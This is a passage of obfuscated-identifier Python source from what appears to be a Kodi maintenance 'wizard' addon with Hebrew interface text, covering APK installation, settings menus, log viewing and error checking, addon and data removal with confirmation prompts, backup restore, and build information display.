		if not wiz .workingURL (O00OOO00O00OO0O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4159
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0O000OOO00OO00 ),'','אנא המתן')#line:4160
		OO0O000OO00O0OOO0 =os .path .join (PACKAGES ,"%s.apk"%OOOOO0OO0OOOO0OO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4161
		try :os .remove (OO0O000OO00O0OOO0 )#line:4162
		except :pass #line:4163
		downloader .download (O00OOO00O00OO0O00 ,OO0O000OO00O0OOO0 ,DP )#line:4164
		xbmc .sleep (100 )#line:4165
		DP .close ()#line:4166
		notify .apkInstaller (OOOOO0OO0OOOO0OO0 )#line:4167
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OO0O000OO00O0OOO0 +'")')#line:4168
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4169
def createMenu (O000O000O00O0OO00 ,OO000OO000O00O0O0 ,O000OOO00O000OOOO ):#line:4175
	if O000O000O00O0OO00 =='saveaddon':#line:4176
		O00000000000OO00O =[]#line:4177
		OOOO0O0000O00O0OO =urllib .quote_plus (OO000OO000O00O0O0 .lower ().replace (' ',''))#line:4178
		OO0OO00OOOO0OOOO0 =OO000OO000O00O0O0 .replace ('Debrid','Real Debrid')#line:4179
		O000OO0OO0O0O00OO =urllib .quote_plus (O000OOO00O000OOOO .lower ().replace (' ',''))#line:4180
		O000OOO00O000OOOO =O000OOO00O000OOOO .replace ('url','URL Resolver')#line:4181
		O00000000000OO00O .append ((THEME2 %O000OOO00O000OOOO .title (),' '))#line:4182
		O00000000000OO00O .append ((THEME3 %'Save %s Data'%OO0OO00OOOO0OOOO0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOOO0O0000O00O0OO ,O000OO0OO0O0O00OO )))#line:4183
		O00000000000OO00O .append ((THEME3 %'Restore %s Data'%OO0OO00OOOO0OOOO0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOOO0O0000O00O0OO ,O000OO0OO0O0O00OO )))#line:4184
		O00000000000OO00O .append ((THEME3 %'Clear %s Data'%OO0OO00OOOO0OOOO0 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OOOO0O0000O00O0OO ,O000OO0OO0O0O00OO )))#line:4185
	elif O000O000O00O0OO00 =='save':#line:4186
		O00000000000OO00O =[]#line:4187
		OOOO0O0000O00O0OO =urllib .quote_plus (OO000OO000O00O0O0 .lower ().replace (' ',''))#line:4188
		OO0OO00OOOO0OOOO0 =OO000OO000O00O0O0 .replace ('Debrid','Real Debrid')#line:4189
		O000OO0OO0O0O00OO =urllib .quote_plus (O000OOO00O000OOOO .lower ().replace (' ',''))#line:4190
		O000OOO00O000OOOO =O000OOO00O000OOOO .replace ('url','URL Resolver')#line:4191
		O00000000000OO00O .append ((THEME2 %O000OOO00O000OOOO .title (),' '))#line:4192
		O00000000000OO00O .append ((THEME3 %'Register %s'%OO0OO00OOOO0OOOO0 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OOOO0O0000O00O0OO ,O000OO0OO0O0O00OO )))#line:4193
		O00000000000OO00O .append ((THEME3 %'Save %s Data'%OO0OO00OOOO0OOOO0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOOO0O0000O00O0OO ,O000OO0OO0O0O00OO )))#line:4194
		O00000000000OO00O .append ((THEME3 %'Restore %s Data'%OO0OO00OOOO0OOOO0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOOO0O0000O00O0OO ,O000OO0OO0O0O00OO )))#line:4195
		O00000000000OO00O .append ((THEME3 %'Import %s Data'%OO0OO00OOOO0OOOO0 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OOOO0O0000O00O0OO ,O000OO0OO0O0O00OO )))#line:4196
		O00000000000OO00O .append ((THEME3 %'Clear Addon %s Data'%OO0OO00OOOO0OOOO0 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OOOO0O0000O00O0OO ,O000OO0OO0O0O00OO )))#line:4197
	elif O000O000O00O0OO00 =='install':#line:4198
		O00000000000OO00O =[]#line:4199
		O000OO0OO0O0O00OO =urllib .quote_plus (O000OOO00O000OOOO )#line:4200
		O00000000000OO00O .append ((THEME2 %O000OOO00O000OOOO ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O000OO0OO0O0O00OO )))#line:4201
		O00000000000OO00O .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O000OO0OO0O0O00OO )))#line:4202
		O00000000000OO00O .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O000OO0OO0O0O00OO )))#line:4203
		O00000000000OO00O .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O000OO0OO0O0O00OO )))#line:4204
		O00000000000OO00O .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O000OO0OO0O0O00OO )))#line:4205
	O00000000000OO00O .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4206
	return O00000000000OO00O #line:4207
def toggleCache (O00OOO0000O00O0OO ):#line:4209
	O0000000OO0OOOOOO =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4210
	OOO00OOO0O0OOOO00 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4211
	if O00OOO0000O00O0OO in ['true','false']:#line:4212
		for OO0O0O0000O0O0OOO in O0000000OO0OOOOOO :#line:4213
			wiz .setS (OO0O0O0000O0O0OOO ,O00OOO0000O00O0OO )#line:4214
	else :#line:4215
		if not O00OOO0000O00O0OO in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4216
			try :#line:4217
				OO0O0O0000O0O0OOO =OOO00OOO0O0OOOO00 [O0000000OO0OOOOOO .index (O00OOO0000O00O0OO )]#line:4218
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OO0O0O0000O0O0OOO ))#line:4219
			except :#line:4220
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O00OOO0000O00O0OO ))#line:4221
		else :#line:4222
			OOO0O0000OOO0OO0O ='true'if wiz .getS (O00OOO0000O00O0OO )=='false'else 'false'#line:4223
			wiz .setS (O00OOO0000O00O0OO ,OOO0O0000OOO0OO0O )#line:4224
def playVideo (O0O0OOOO0O0OOOO0O ):#line:4226
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O0O0OOOO0O0OOOO0O )#line:4227
	if 'watch?v='in O0O0OOOO0O0OOOO0O :#line:4228
		OO0000O0O0O0O0OO0 ,O0O000OOOO000O000 =O0O0OOOO0O0OOOO0O .split ('?')#line:4229
		OO0000O0O0OO000OO =O0O000OOOO000O000 .split ('&')#line:4230
		for O0OO0OO0000O00OOO in OO0000O0O0OO000OO :#line:4231
			if O0OO0OO0000O00OOO .startswith ('v='):#line:4232
				O0O0OOOO0O0OOOO0O =O0OO0OO0000O00OOO [2 :]#line:4233
				break #line:4234
			else :continue #line:4235
	elif 'embed'in O0O0OOOO0O0OOOO0O or 'youtu.be'in O0O0OOOO0O0OOOO0O :#line:4236
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O0O0OOOO0O0OOOO0O )#line:4237
		OO0000O0O0O0O0OO0 =O0O0OOOO0O0OOOO0O .split ('/')#line:4238
		if len (OO0000O0O0O0O0OO0 [-1 ])>5 :#line:4239
			O0O0OOOO0O0OOOO0O =OO0000O0O0O0O0OO0 [-1 ]#line:4240
		elif len (OO0000O0O0O0O0OO0 [-2 ])>5 :#line:4241
			O0O0OOOO0O0OOOO0O =OO0000O0O0O0O0OO0 [-2 ]#line:4242
	wiz .log ("YouTube URL: %s"%O0O0OOOO0O0OOOO0O )#line:4243
	yt .PlayVideo (O0O0OOOO0O0OOOO0O )#line:4244
def viewLogFile ():#line:4246
	O00O0O0OOOO000OOO =wiz .Grab_Log (True )#line:4247
	OO00O0OO0OOOO00OO =wiz .Grab_Log (True ,True )#line:4248
	OO0O0OO00O0OO000O =0 ;O0O0000O00O00OO00 =O00O0O0OOOO000OOO #line:4249
	if not OO00O0OO0OOOO00OO ==False and not O00O0O0OOOO000OOO ==False :#line:4250
		OO0O0OO00O0OO000O =DIALOG .select (ADDONTITLE ,["View %s"%O00O0O0OOOO000OOO .replace (LOG ,""),"View %s"%OO00O0OO0OOOO00OO .replace (LOG ,"")])#line:4251
		if OO0O0OO00O0OO000O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4252
	elif O00O0O0OOOO000OOO ==False and OO00O0OO0OOOO00OO ==False :#line:4253
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4254
		return #line:4255
	elif not O00O0O0OOOO000OOO ==False :OO0O0OO00O0OO000O =0 #line:4256
	elif not OO00O0OO0OOOO00OO ==False :OO0O0OO00O0OO000O =1 #line:4257
	O0O0000O00O00OO00 =O00O0O0OOOO000OOO if OO0O0OO00O0OO000O ==0 else OO00O0OO0OOOO00OO #line:4259
	OO0O0OOOOO0OOO0O0 =wiz .Grab_Log (False )if OO0O0OO00O0OO000O ==0 else wiz .Grab_Log (False ,True )#line:4260
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O0O0000O00O00OO00 ),OO0O0OOOOO0OOO0O0 )#line:4262
def errorChecking (log =None ,count =None ,all =None ):#line:4264
	if log ==None :#line:4265
		OOO00000OO000OO00 =wiz .Grab_Log (True )#line:4266
		OO0O0O00O0OOOO00O =wiz .Grab_Log (True ,True )#line:4267
		if not OO0O0O00O0OOOO00O ==False and not OOO00000OO000OO00 ==False :#line:4268
			O0OO0000O0O0OOOOO =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(OOO00000OO000OO00 .replace (LOG ,""),errorChecking (OOO00000OO000OO00 ,True ,True )),"View %s: %s error(s)"%(OO0O0O00O0OOOO00O .replace (LOG ,""),errorChecking (OO0O0O00O0OOOO00O ,True ,True ))])#line:4269
			if O0OO0000O0O0OOOOO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4270
		elif OOO00000OO000OO00 ==False and OO0O0O00O0OOOO00O ==False :#line:4271
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4272
			return #line:4273
		elif not OOO00000OO000OO00 ==False :O0OO0000O0O0OOOOO =0 #line:4274
		elif not OO0O0O00O0OOOO00O ==False :O0OO0000O0O0OOOOO =1 #line:4275
		log =OOO00000OO000OO00 if O0OO0000O0O0OOOOO ==0 else OO0O0O00O0OOOO00O #line:4276
	if log ==False :#line:4277
		if count ==None :#line:4278
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4279
			return False #line:4280
		else :#line:4281
			return 0 #line:4282
	else :#line:4283
		if os .path .exists (log ):#line:4284
			OOO0OO0OO00000000 =open (log ,mode ='r');O0OOO0O0OO00000O0 =OOO0OO0OO00000000 .read ().replace ('\n','').replace ('\r','');OOO0OO0OO00000000 .close ()#line:4285
			OO0O0000000O0O0OO =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O0OOO0O0OO00000O0 )#line:4286
			if not count ==None :#line:4287
				if all ==None :#line:4288
					OOO000OOO00OOO00O =0 #line:4289
					for O000O0O0OO0OOO0OO in OO0O0000000O0O0OO :#line:4290
						if ADDON_ID in O000O0O0OO0OOO0OO :OOO000OOO00OOO00O +=1 #line:4291
					return OOO000OOO00OOO00O #line:4292
				else :return len (OO0O0000000O0O0OO )#line:4293
			if len (OO0O0000000O0O0OO )>0 :#line:4294
				OOO000OOO00OOO00O =0 ;O0OOOOO0OOO00OO0O =""#line:4295
				for O000O0O0OO0OOO0OO in OO0O0000000O0O0OO :#line:4296
					if all ==None and not ADDON_ID in O000O0O0OO0OOO0OO :continue #line:4297
					else :#line:4298
						OOO000OOO00OOO00O +=1 #line:4299
						O0OOOOO0OOO00OO0O +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OOO000OOO00OOO00O ,O000O0O0OO0OOO0OO .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4300
				if OOO000OOO00OOO00O >0 :#line:4301
					wiz .TextBox (ADDONTITLE ,O0OOOOO0OOO00OO0O )#line:4302
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4303
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4304
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4305
ACTION_PREVIOUS_MENU =10 #line:4307
ACTION_NAV_BACK =92 #line:4308
ACTION_MOVE_LEFT =1 #line:4309
ACTION_MOVE_RIGHT =2 #line:4310
ACTION_MOVE_UP =3 #line:4311
ACTION_MOVE_DOWN =4 #line:4312
ACTION_MOUSE_WHEEL_UP =104 #line:4313
ACTION_MOUSE_WHEEL_DOWN =105 #line:4314
ACTION_MOVE_MOUSE =107 #line:4315
ACTION_SELECT_ITEM =7 #line:4316
ACTION_BACKSPACE =110 #line:4317
ACTION_MOUSE_LEFT_CLICK =100 #line:4318
ACTION_MOUSE_LONG_CLICK =108 #line:4319
def LogViewer (default =None ):#line:4321
	class O0O000OOOO0O0O00O (xbmcgui .WindowXMLDialog ):#line:4322
		def __init__ (OOO0O00OOOO000000 ,*OOOO0OOO0OO000000 ,**O000OO00000O0OO0O ):#line:4323
			OOO0O00OOOO000000 .default =O000OO00000O0OO0O ['default']#line:4324
		def onInit (O0O00O000000O00OO ):#line:4326
			O0O00O000000O00OO .title =101 #line:4327
			O0O00O000000O00OO .msg =102 #line:4328
			O0O00O000000O00OO .scrollbar =103 #line:4329
			O0O00O000000O00OO .upload =201 #line:4330
			O0O00O000000O00OO .kodi =202 #line:4331
			O0O00O000000O00OO .kodiold =203 #line:4332
			O0O00O000000O00OO .wizard =204 #line:4333
			O0O00O000000O00OO .okbutton =205 #line:4334
			O000O00OOOOOOOO0O =open (O0O00O000000O00OO .default ,'r')#line:4335
			O0O00O000000O00OO .logmsg =O000O00OOOOOOOO0O .read ()#line:4336
			O000O00OOOOOOOO0O .close ()#line:4337
			O0O00O000000O00OO .titlemsg ="%s: %s"%(ADDONTITLE ,O0O00O000000O00OO .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4338
			O0O00O000000O00OO .showdialog ()#line:4339
		def showdialog (O0000O00O0O0OO0O0 ):#line:4341
			O0000O00O0O0OO0O0 .getControl (O0000O00O0O0OO0O0 .title ).setLabel (O0000O00O0O0OO0O0 .titlemsg )#line:4342
			O0000O00O0O0OO0O0 .getControl (O0000O00O0O0OO0O0 .msg ).setText (wiz .highlightText (O0000O00O0O0OO0O0 .logmsg ))#line:4343
			O0000O00O0O0OO0O0 .setFocusId (O0000O00O0O0OO0O0 .scrollbar )#line:4344
		def onClick (O00O0O00OO0OO000O ,O00000O0O00O0OOOO ):#line:4346
			if O00000O0O00O0OOOO ==O00O0O00OO0OO000O .okbutton :O00O0O00OO0OO000O .close ()#line:4347
			elif O00000O0O00O0OOOO ==O00O0O00OO0OO000O .upload :O00O0O00OO0OO000O .close ();uploadLog .Main ()#line:4348
			elif O00000O0O00O0OOOO ==O00O0O00OO0OO000O .kodi :#line:4349
				OO00O00O00O00OOOO =wiz .Grab_Log (False )#line:4350
				OOOOO00OOO00000OO =wiz .Grab_Log (True )#line:4351
				if OO00O00O00O00OOOO ==False :#line:4352
					O00O0O00OO0OO000O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4353
					O00O0O00OO0OO000O .getControl (O00O0O00OO0OO000O .msg ).setText ("Log File Does Not Exists!")#line:4354
				else :#line:4355
					O00O0O00OO0OO000O .titlemsg ="%s: %s"%(ADDONTITLE ,OOOOO00OOO00000OO .replace (LOG ,''))#line:4356
					O00O0O00OO0OO000O .getControl (O00O0O00OO0OO000O .title ).setLabel (O00O0O00OO0OO000O .titlemsg )#line:4357
					O00O0O00OO0OO000O .getControl (O00O0O00OO0OO000O .msg ).setText (wiz .highlightText (OO00O00O00O00OOOO ))#line:4358
					O00O0O00OO0OO000O .setFocusId (O00O0O00OO0OO000O .scrollbar )#line:4359
			elif O00000O0O00O0OOOO ==O00O0O00OO0OO000O .kodiold :#line:4360
				OO00O00O00O00OOOO =wiz .Grab_Log (False ,True )#line:4361
				OOOOO00OOO00000OO =wiz .Grab_Log (True ,True )#line:4362
				if OO00O00O00O00OOOO ==False :#line:4363
					O00O0O00OO0OO000O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4364
					O00O0O00OO0OO000O .getControl (O00O0O00OO0OO000O .msg ).setText ("Log File Does Not Exists!")#line:4365
				else :#line:4366
					O00O0O00OO0OO000O .titlemsg ="%s: %s"%(ADDONTITLE ,OOOOO00OOO00000OO .replace (LOG ,''))#line:4367
					O00O0O00OO0OO000O .getControl (O00O0O00OO0OO000O .title ).setLabel (O00O0O00OO0OO000O .titlemsg )#line:4368
					O00O0O00OO0OO000O .getControl (O00O0O00OO0OO000O .msg ).setText (wiz .highlightText (OO00O00O00O00OOOO ))#line:4369
					O00O0O00OO0OO000O .setFocusId (O00O0O00OO0OO000O .scrollbar )#line:4370
			elif O00000O0O00O0OOOO ==O00O0O00OO0OO000O .wizard :#line:4371
				OO00O00O00O00OOOO =wiz .Grab_Log (False ,False ,True )#line:4372
				OOOOO00OOO00000OO =wiz .Grab_Log (True ,False ,True )#line:4373
				if OO00O00O00O00OOOO ==False :#line:4374
					O00O0O00OO0OO000O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4375
					O00O0O00OO0OO000O .getControl (O00O0O00OO0OO000O .msg ).setText ("Log File Does Not Exists!")#line:4376
				else :#line:4377
					O00O0O00OO0OO000O .titlemsg ="%s: %s"%(ADDONTITLE ,OOOOO00OOO00000OO .replace (ADDONDATA ,''))#line:4378
					O00O0O00OO0OO000O .getControl (O00O0O00OO0OO000O .title ).setLabel (O00O0O00OO0OO000O .titlemsg )#line:4379
					O00O0O00OO0OO000O .getControl (O00O0O00OO0OO000O .msg ).setText (wiz .highlightText (OO00O00O00O00OOOO ))#line:4380
					O00O0O00OO0OO000O .setFocusId (O00O0O00OO0OO000O .scrollbar )#line:4381
		def onAction (OOO0OO0O00O0OOOOO ,O0O0OO00OO00000O0 ):#line:4383
			if O0O0OO00OO00000O0 ==ACTION_PREVIOUS_MENU :OOO0OO0O00O0OOOOO .close ()#line:4384
			elif O0O0OO00OO00000O0 ==ACTION_NAV_BACK :OOO0OO0O00O0OOOOO .close ()#line:4385
	if default ==None :default =wiz .Grab_Log (True )#line:4386
	O0OO0000O00O00000 =O0O000OOOO0O0O00O ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4387
	O0OO0000O00O00000 .doModal ()#line:4388
	del O0OO0000O00O00000 #line:4389
def removeAddon (O0O0O00000O0000OO ,O00OO00O000000OOO ,over =False ):#line:4391
	if not over ==False :#line:4392
		OO00O0OO0OO0OOO00 =1 #line:4393
	else :#line:4394
		OO00O0OO0OO0OOO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O00OO00O000000OOO ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O0O0O00000O0000OO ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4395
	if OO00O0OO0OO0OOO00 ==1 :#line:4396
		OOO00000OO00000OO =os .path .join (ADDONS ,O0O0O00000O0000OO )#line:4397
		wiz .log ("Removing Addon %s"%O0O0O00000O0000OO )#line:4398
		wiz .cleanHouse (OOO00000OO00000OO )#line:4399
		xbmc .sleep (1000 )#line:4400
		try :shutil .rmtree (OOO00000OO00000OO )#line:4401
		except Exception as O0OOO0O00O0OOOOO0 :wiz .log ("Error removing %s"%O0O0O00000O0000OO ,xbmc .LOGNOTICE )#line:4402
		removeAddonData (O0O0O00000O0000OO ,O00OO00O000000OOO ,over )#line:4403
	if over ==False :#line:4404
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O00OO00O000000OOO ))#line:4405
def removeAddonData (O000O0OOOO0OO00OO ,name =None ,over =False ):#line:4407
	if O000O0OOOO0OO00OO =='all':#line:4408
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4409
			wiz .cleanHouse (ADDOND )#line:4410
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4411
	elif O000O0OOOO0OO00OO =='uninstalled':#line:4412
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4413
			OOOO0OOO00OO0000O =0 #line:4414
			for O00O000OOOOOOOOOO in glob .glob (os .path .join (ADDOND ,'*')):#line:4415
				OO0O000O000000OOO =O00O000OOOOOOOOOO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4416
				if OO0O000O000000OOO in EXCLUDES :pass #line:4417
				elif os .path .exists (os .path .join (ADDONS ,OO0O000O000000OOO )):pass #line:4418
				else :wiz .cleanHouse (O00O000OOOOOOOOOO );OOOO0OOO00OO0000O +=1 ;wiz .log (O00O000OOOOOOOOOO );shutil .rmtree (O00O000OOOOOOOOOO )#line:4419
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOOO0OOO00OO0000O ))#line:4420
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4421
	elif O000O0OOOO0OO00OO =='empty':#line:4422
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4423
			OOOO0OOO00OO0000O =wiz .emptyfolder (ADDOND )#line:4424
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OOOO0OOO00OO0000O ))#line:4425
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4426
	else :#line:4427
		OO0OOO00O0O000000 =os .path .join (USERDATA ,'addon_data',O000O0OOOO0OO00OO )#line:4428
		if O000O0OOOO0OO00OO in EXCLUDES :#line:4429
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4430
		elif os .path .exists (OO0OOO00O0O000000 ):#line:4431
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O000O0OOOO0OO00OO ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4432
				wiz .cleanHouse (OO0OOO00O0O000000 )#line:4433
				try :#line:4434
					shutil .rmtree (OO0OOO00O0O000000 )#line:4435
				except :#line:4436
					wiz .log ("Error deleting: %s"%OO0OOO00O0O000000 )#line:4437
			else :#line:4438
				wiz .log ('Addon data for %s was not removed'%O000O0OOOO0OO00OO )#line:4439
	wiz .refresh ()#line:4440
def restoreit (OOOO000OO0OO000O0 ):#line:4442
	if OOOO000OO0OO000O0 =='build':#line:4443
		OO00000000OOO00O0 =freshStart ('restore')#line:4444
		if OO00000000OOO00O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4445
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4446
		wiz .skinToDefault ()#line:4447
	wiz .restoreLocal (OOOO000OO0OO000O0 )#line:4448
def restoreextit (OOOOOOOOO000OO0O0 ):#line:4450
	if OOOOOOOOO000OO0O0 =='build':#line:4451
		OO0OO0000000OOO0O =freshStart ('restore')#line:4452
		if OO0OO0000000OOO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4453
	wiz .restoreExternal (OOOOOOOOO000OO0O0 )#line:4454
def buildInfo (O0O000OOO0OOOO0O0 ):#line:4456
	if wiz .workingURL (SPEEDFILE )==True :#line:4457
		if wiz .checkBuild (O0O000OOO0OOOO0O0 ,'url'):#line:4458
			O0O000OOO0OOOO0O0 ,OO0O0OOOOOO0000O0 ,OOOOOOO0O00OOO0O0 ,OOOO000OO0000OOO0 ,O00OO000O00OOO00O ,OOOO00O0OOOOO0OOO ,O0O000O0O000O0O00 ,OOOOOO0OO0OO0OO0O ,O0000000O0O000OO0 ,O0O000OO00O0O0O0O ,OOO00O0O00O000O00 =wiz .checkBuild (O0O000OOO0OOOO0O0 ,'all')#line:4459
			O0O000OO00O0O0O0O ='Yes'if O0O000OO00O0O0O0O .lower ()=='yes'else 'No'#line:4460
			O0OO00O0OOOO0O000 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O000OOO0OOOO0O0 )#line:4461
			O0OO00O0OOOO0O000 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0O0OOOOOO0000O0 )#line:4462
			if not OOOO00O0OOOOO0OOO =="http://":#line:4463
				O0OO00O0OOO000O0O =wiz .themeCount (O0O000OOO0OOOO0O0 ,False )#line:4464
				O0OO00O0OOOO0O000 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O0OO00O0OOO000O0O ))#line:4465
			O0OO00O0OOOO0O000 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00OO000O00OOO00O )#line:4466
			O0OO00O0OOOO0O000 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O000OO00O0O0O0O )#line:4467
			O0OO00O0OOOO0O000 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO00O0O00O000O00 )#line:4468
			wiz .TextBox (ADDONTITLE ,O0OO00O0OOOO0O000 )#line:4469
		else :wiz .log ("Invalid Build Name!")#line:4470
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4471
def buildVideo (OOOO0O0O00O0OOO00 ):#line:4473
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4474
	if wiz .workingURL (SPEEDFILE )==True :#line:4475
